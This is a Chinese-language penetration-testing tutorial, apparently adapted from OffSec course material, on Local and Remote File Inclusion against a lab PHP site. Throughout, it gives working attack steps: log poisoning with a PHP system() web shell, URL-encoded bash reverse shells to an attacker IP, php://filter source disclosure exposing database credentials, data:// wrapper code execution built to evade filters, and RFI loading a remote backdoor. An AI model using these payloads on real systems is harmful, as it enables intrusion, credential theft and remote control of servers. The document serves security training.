---
title: "常見網頁應用服務攻擊之檔案引用漏洞 LFI&RFI"
date: 2025-11-02
description: "常見的網頁應用服務漏洞攻擊系列除了我們提到目錄遍歷漏洞攻擊之外，再來談檔案引用漏洞，我們會分析這個漏洞跟目錄遍歷之間的差異，並且向各位介紹本地檔案引用(Local File Inclusion, LFI)以及遠端檔案引用(Remote, File Inclusion, RFI)"
hideTOC: false
targetKeyword: LFI & RFI
draft: false
tags: 
  - "lfi"
  - "php封裝器"
  - "rfi"
  - "wrapper"
  - "本地檔案引用"
  - "遠端檔案引用"
lang: zh
---
## 前言

常見的網頁應用服務漏洞攻擊系列除了我們提到[[directory-traversal-vulnerability|常見網頁應用服務攻擊之目錄遍歷漏洞 Directory Traversal]]攻擊之外，再來談檔案引用漏洞，我們會分析這個漏洞跟目錄遍歷之間的差異，並且向各位介紹本地檔案引用 (Local File Inclusion, LFI) 以及遠端檔案引用 (Remote, File Inclusion, RFI)

## 本地檔案引用 (Local File Inclusion, LFI)
在我們了解本地檔案引用方法之前，我們先花些時間來了解這個漏洞跟目錄遍歷之間的差別，他們兩個的概念時常被滲透測試員以及資安專業人員搞混，如果我們對這些漏洞的樣貌都分不清楚的話，我們很可能會失去能夠執行惡意 code 的機會

在目錄遍歷漏洞時我們利用它取得網頁伺服器根目錄之外的檔案內容，而檔案引用漏洞則是允許我們在執行中的應用程式"引入"其他的檔案，這代表我們可以利用該漏洞執行 local 或者遠端的檔案，所以讀者需要分清楚，目錄遍歷只是允許我們讀檔案內容而已

不僅該漏洞能讓我們引入新的檔案進應用程式的 code 裡，同時我們也可以看到非執行檔案的內容，舉例來說，在利用目錄遍歷漏洞針對 PHP 網頁應用服務跟 admin.php 時，我們可以看到完整的 PHP 檔案

另一方面，如果我們利用的是檔案引用漏洞，就不是檢視 admin.php 了，而是執行該檔案，而對這個漏洞來說，我們的目標是利用它拿到遠端程式執行方法，要達成這個目的，我們需要搭配 Log 下毒手法，這個手法需要變更傳輸給網頁應用服務的資料，最終讓伺服器裡的 log 包含可執行的程式

所以在 LFI 漏洞情境中，只要插入了可執行的程式，在本地執行的檔案引用時就會自動運作，讓我們來實驗看看寫入一組可執行的程式進 Apache的access.log 檔案，這個檔案在 "/var/log/apache2" 目錄底下，我們要先來看該 Log 檔案有哪些資訊是我們可以控制的

控制的意思是我們在送到網頁應用服務之前可以變更哪些資訊，主要可以用 Apache 網頁伺服器文件[^1]來查看，或者利用 LFI 來顯示檔案內容，首先我們用 curl 來分析 Mountain Desserts 網頁裡面哪些元素跟 Log 有關

我們可以利用目錄遍歷漏洞來查找 access.log 的位置，所以我們需要利用相對路徑組合該檔案，並且用 "page" 的參數作為輸入

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [01/Nov/2025:10:34:55 +0000] "GET /meteor/index.php?page=admin.php
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
...
```

可以注意到這個 Log 裡面包含了 User Agent，所以在我們寄送 HTTP 請求之前，我們可以利用 Burp Suite 嘗試變更 User Agent 的內容，從而決定我們想要寫入進 access.log 檔案的內容

除了指定特定的檔案，該指令也利用了目錄遍歷攻擊手法，我們一樣可以把流程換到 Burp Suite 上，把 Proxy 打開後我們實驗 "Mountain Desserts" 網站頁面，我們點選 "Admin" 連結按鈕，然後回 Burp Suite 看歷史紀錄，我們一樣送進 Repeater 裡

![Unmodified-Request-in-Burp-Repeater](https://media.secologies.com/Unmodified-Request-in-Burp-Repeater.webp)
*[^3]*

接著我們變更在 User Agent 欄位裡面加上 PHP 程式碼，我們想要利用 PHP 系統函數去呼叫目標系統來執行cmd參數，如果讀者了解PHP的話就知道我們想要用echo來呼叫cmd的執行結果

```
<?php echo system($_GET['cmd']); ?>
```

修改完之後直接按下送出

![Modified-Request-in-Burp-Repeater](https://media.secologies.com/Modified-Request-in-Burp-Repeater.webp)
*[^3]*

而<?php ... ?>就會寫進去Apache裡的access.log檔案中，後續我們透過LFI方法就可以執行這段code，那我們該怎麼呼叫呢？一樣利用page參數呼叫相對路徑找到access.log檔案

```
../../../../../../../../../var/log/apache2/access.log
```

同時我們還需要加上cmd參數呼叫PHP程式碼區塊，首先我們透過"ps"指令驗證log下毒手法有成功，由於我們想要同時使用page跟相對路徑這兩個參數，所以我們可以利用AND符號(&)

在Burp Suite裡送出請求之前我們也要把原本User Agent的內容刪除掉，以防二次Log下毒的情形發生，也確保讓log裡的PHP程式碼執行多次而被受害者發現，送出後我們可以檢查一下請求的Raw格式，然後我們看回應的結果


![Output-of-the-specified-ls-command-through-Log-Poisoning](https://media.secologies.com/Output-of-the-specified-ls-command-through-Log-Poisoning.webp)
*[^3]*

上圖可以看到我們對access.log確實執行了"ps"指令，代表我們成功把PHP程式碼塞進去了，接著我們再繼續送參數帶進去"ls -la"

![Using-a-command-with-parameters](https://media.secologies.com/Using-a-command-with-parameters.webp)
*[^3]*

送出"ls -la"後從上述回應來看我們失敗了，這是因為指令跟參數之間出現了空格，我們需要使用其他種方法來繞過這種限制，例如輸入欄位分離器(Input Field Separators, IFS)或者URL編碼，如果我們要採用IFS，我們可以轉譯空格的格式，像是

```
IFS=' ' # Set IFS to space
input="cat /etc/passwd"
read -r cmd arg <<< "$input"
$cmd $arg
```

上述的語法函式採用IFS作為判斷，我們就能夠利用這段code來執行指定，但不會被任何空格字元干擾，而URL編碼的話就轉換成"%20"，我們來嘗試編碼看看，並且重新送出試試看

![URL-encoding-a-space-with-20](https://media.secologies.com/URL-encoding-a-space-with-20.webp)
*[^3]*

讀者可以看到上圖的回應結果這次成功了，只要該漏洞存在，我們可以放入任何想要在目標系統上執行的指令，例如取得逆向shell，或者在系統上新增我們的SSH金鑰進去"authorized\_keys"檔案，新增一組使用者

我們來實驗看看透過cmd參數執行指令嘗試取得一組逆向shell，例如我們可以利用單行式bash TCP逆向shell

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

儘管我們可以利用PHP系統函式來執行我們想要的指令，我們應該注意有沒有利用Bourne Shell來執行指令，或者有時叫做"sh"，而不是透過Bash來執行時，例如上面的單行逆向shell就存在Buorne Shell沒有支援的語法

為了確保逆向shell是透過Bash執行的，我們就需要修改逆向shell的指令，我們需要在原先的單行指令中加上參數"bash -c"，這會讓該指令指定用Bash執行

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

讓我們再把這句的特殊字元通通用URL編碼起來

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

我們再把這改良過的指令放進Burp Suite裡的請求


![Encoded-Bash-reverse-shell-in-cmd-parameter](https://media.secologies.com/Encoded-Bash-reverse-shell-in-cmd-parameter.webp)
*[^3]*

要注意在我們送出請求之前，請先在自己的機器裡用Netcat監聽4444的port，我們要用這個端口接收任何來自目標系統回傳的資訊，開啟後就可以用送出請求了

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```

上述在我們的實驗中成功啟動逆向shell，可以從我們的機器裡跟目標系統互動了

而LFI攻擊也可以在Windows目標裡施行，Windows系統環境跟Linux相比執行LFI攻擊的差異只在於檔案路徑的組成以及程式碼執行的方法，儘管PHP系統函式的編譯版本在不同的作業系統裡架構稍微不同，但我們之前的PHP程式碼在Linux上跟Windows上一樣可以運作

當我們想在Windows上執行Log下毒方法時，我們要了解的是目標系統的網頁伺服器儲存log檔案的應用服務路徑，例如目標使用XAMPP[^2]，就代表它的Apache log儲存在"C:\xampp\apache\logs\"

但另外要注意的是檔案引用漏洞的成敗取決於網頁應用服務底層的程式語言、版本以及網頁伺服器的設定，除了常見的PHP之外，我們在其他種框架或者伺服器腳本語言一樣可以利用LFI跟遠端檔案引用(Remote File Inclusion, RFI)漏洞來攻擊，例如：

- Perl
- Active Server Pages Extended
- Active Server Pages
- Java Server Pages

但不管背後是哪個語言，利用這類的漏洞手法都差不多，像是如果我們考慮在JSP網頁應用服務上施行LFI漏洞，如果我們可以寫JSP程式利用Log下毒插進去該JSP檔案，再用LFI漏洞引用這個檔案就可以執行惡意內容了

跟前面的PHP相比之下只有差在Log下毒時腳本的語言而已，在現實的安全性評估中，我們時常會發現檔案引用漏洞出現在PHP網頁應用服務當中，畢竟PHP這語言已經出現了30年了(比我年紀還大🫣)

而其他的框架或者伺服器腳本語言的架構都比較新，所以它們幾乎在設計時就考量進來安全性，這也是為什麼用Go或Ruby等近代語言寫出來的網頁伺服器很少發現該漏洞，然而並非總是如此，像是之前Node.js裡在現代後端JavaScript執行環境中被發現有LFI漏洞

所以讀者在進行網頁應用服務白箱/黑箱測試時，即使網站架構很新，我們還是不要跳過LFI或RFI漏洞的檢測為妙

## PHP封裝器(Wrapper)

如果讀者對於軟體工程有一定經驗的話，肯定知道wrapper這個概念，而PHP提供了多種協定封裝器來增強語言的能力，舉例來說，PHP封裝器可以設計用來呈現或存取本地/遠端的檔案系統

從滲透測試的角度來看，我們則可以在PHP網頁應用服務上利用這些封裝器繞過過濾器或者透過檔案引用漏洞獲得程式的執行，由於有太多種，我們先專注在"php://filter"、"data://"以及wrappers這幾種方法

我們先來看"php://filter"這個封裝器，它可以用來顯示檔案內容，不管這些檔案有沒有經過ROT13或Base64的編碼，在前一節我們用LFI漏洞引用了檔案來執行，但如果我們改用"php://filter"的話就可以直接顯示執行檔像是.php裡的內容，就可以不去執行該檔案

這可以讓我們先檢查PHP檔案內部的邏輯，找出關鍵的隱私資訊並分析整個網頁應用程式的邏輯，畢竟不太可能所有情況都可以直接執行我們的惡意內容，以及如果沒搞清楚整個架構，很可能我們會在Log暴露自己的行蹤

我們一樣在Mountain Desserts網頁上進行實驗，我們利用上一章使用到的目標路徑page參數指定為"admin.php"這個頁面

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

我們收到之前看過的維護資訊，我們同時也看到\<body\>標籤沒有在整個code裡做收尾\</body\>，當下我們確定頁面裡有東西遺失了，但由於PHP在伺服器端裡執行了，所以沒有顯示出來

這個結果與之前的相比之下，原先的內容或者我們用瀏覽器看到的原始碼可以推斷出，index.php頁面有些部分是損毀的

再來我們嘗試引用檔案看看，搭配"php://filter"可以讓我們更好了解整個運作的方法，我們一樣做第一次實驗所以先不編碼任何字元，PHP wrapper使用resource當作參數的輸入，用來指定想要呈現的檔案流，通常我們會指定某個檔案，同時我們可以用絕對或相對路徑來看該檔案

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

我們改用resource指定資料流後出現一樣的結果，因為PHP程式被引用後，一樣透過LFI漏洞執行所以結果很合理，現在，讓我們改成使用Base64編碼字元，我們利用convert.base64-encode函式把resource的內容轉成base64字串

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

上面的結果可以看到我們輸入編碼過的字串後，取得了頁面裡剩餘的資訊，而我們再用base64工具加上"-d"的參數來解碼這些被編碼過的資料試試

```
kali@kali:~$ echo
"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtO
CI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWF
sLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgI
CAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGF
kbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZ
SA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiM
iOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hb
WUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewo
gIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ub
mVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

在我們解碼過後可以看到，內容包含MySQL的連接資訊，包含會吃username以及password，下一步我們就可以利用這些身份憑證資訊來連結目標原先的資料庫，或者嘗試我們以前取得的SSH使用者帳號搭配暴力破解密碼來進行連接

我們目前見識到"php://filter"封裝器可以用來引入檔案的內容，而同樣的我們也可以利用"data://"封裝器來施行執行惡意程式，這個封裝器將明文資料或者base64編碼資料格式，嵌入進運行中的網頁應用服務

這是為了某些情況下我們無法將PHP程式污染進本地檔案時的解法，我們一樣用Mountain Desserts頁面來實驗"data://"封裝器，期間我們需要指定嵌入資料的型態及內容

第一次嘗試時我們嘗試嵌入小型的URL編碼PHP程式進網頁應用服務的code中，我們用先前使用的那一組，再加上呼叫"ls"指令

```
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

上面的輸入及結果代表我們成功嵌入了資料進去，再利用檔案引用漏洞以及"data://"封裝器執行了"ls"這個指令，但讀者要注意的是，如果目標的網頁應用服務防火牆或者設置了其他種安全機制，那些工具可能會過濾掉"system"或者PHP程式內容等元素字串

所以我們才需要介紹"data://"這個封裝器來封裝base64編碼格式的資料來繞過，接著我們把先前的PHP惡意內容用base64編碼起來，再用curl跟"data://"來嵌入進目標系統內執行

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.s
```

Boom！如此我們便把base64編碼的PHP程式放進去並且執行起來了，這在我們想要繞過基本的過濾機制時是很有用的方法，但要額外注意的是，有時候可能不會成功

因為這需要目標的服務裡安裝PHP時也有把"data://"封裝器給裝起來，而預設的"allow_url_include"設定必須是啟動時我們才能利用這方法

## 遠端檔案引用 (Remote File Inclusion, RFI)

遠端檔案引用(RFI)漏洞通常比本地檔案引用(LFI)漏洞還要少見，因為它需要目標系統啟動特別的設置，例如在PHP的網頁應用服務當中，它需要跟"data://"封裝器一樣，目標系統開啟"allow_url_include"這類設置才能夠施展RFI漏洞

照文件來看，這個配置應該是預設所有版本的PHP都關閉著的，從名稱來看，LFI漏洞可以引用本地的檔案來執行我們想要的內容，而RFI漏洞則反之需要透過HTTP或SMB遠端傳進去檔案來讓我們執行

那我們要如何確認這個配置有打開的？通常如果目標網頁應用服務系統原始碼內有載入任何檔案，或者外部引入其他函式庫或應用服務資料的話，就代表該伺服器是有開啟的，而我們則可以利用同樣的目錄遍歷跟LFI漏洞技巧來達到RFI漏洞攻擊

Kali Linux裡面有內建數種PHP webshell來執行RFI攻擊，這些檔案儲存在"/usr/share/webshells/php/"裡頭，webshell是指小型的腳本提供網頁版的指令終端介面，能讓我們更簡單跟方便的執行指令

舉例來說，我們可以在Mountain Desserts頁面實驗"simple-backdoor.php"這個webshell來執行RFI漏洞，我們來看一下"simple-backdoor.php" webshell的內容，來嘗試跟上一節的LFI搭配造出RFI

裡面的code其實跟我們先前用的PHP程式內容很相似，它會吃cmd參數的指令，並且透過它呼叫系統函式

```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

為了利用RFI漏洞，我們需要先製作一份遠端檔案讓目標系統來存取，利用Python3 http.server模組啟動網頁伺服器，再把檔案放進去讓目標系統可以遠端引用該檔案，http.server模組會將網頁根目錄為我們目前終端機的位置

其實如果我們只是想要讓目標系統遠端引用的話，其實也有另一種方法，就是把檔案放到一些可以公開存取的位置，例如Github或其他版控服務上，但這很容易留下蹤跡，所以讀者要使用這方法時要很慎重的考量

```
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

我們選定"usr/share/webshells/php/"這個目錄作為我們要執行的網頁伺服器，接著我們利用curl透過HTTP請求送進去我們想要引入的位置，並且指定執行"ls"指令

```
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>
```

如此我們就成功利用RFI漏洞讓目標伺服器引用了遠端機器的webshell了，後續我們就可以Netcat建立逆向shell，在之後跟目標系統建立連線shell，跟LFI情境一樣想打什麼指令就打什麼指令了

至此我們介紹了檔案引用漏洞中常見的兩個手法，其中還有利用了一些PHP內部的封裝器協定，如果讀者的目標是其他種語言的話，可以檢查官方文件是否有提供類似的設計

[^1]: The Apache Software Foundation, "Log Files," [https://httpd.apache.org/docs/2.4/logs.html#accesslog](https://httpd.apache.org/docs/2.4/logs.html#accesslog)

[^2]: Apache Friends, "XAMPP Apache + MariaDB + PHP + Perl," [https://www.apachefriends.org/](https://www.apachefriends.org/)

[^3]: OffSec, “Common Web Application Attacks: File Inclusion Vulnerabilities,” The Penetration Testing with Kali Linux (PEN-200).

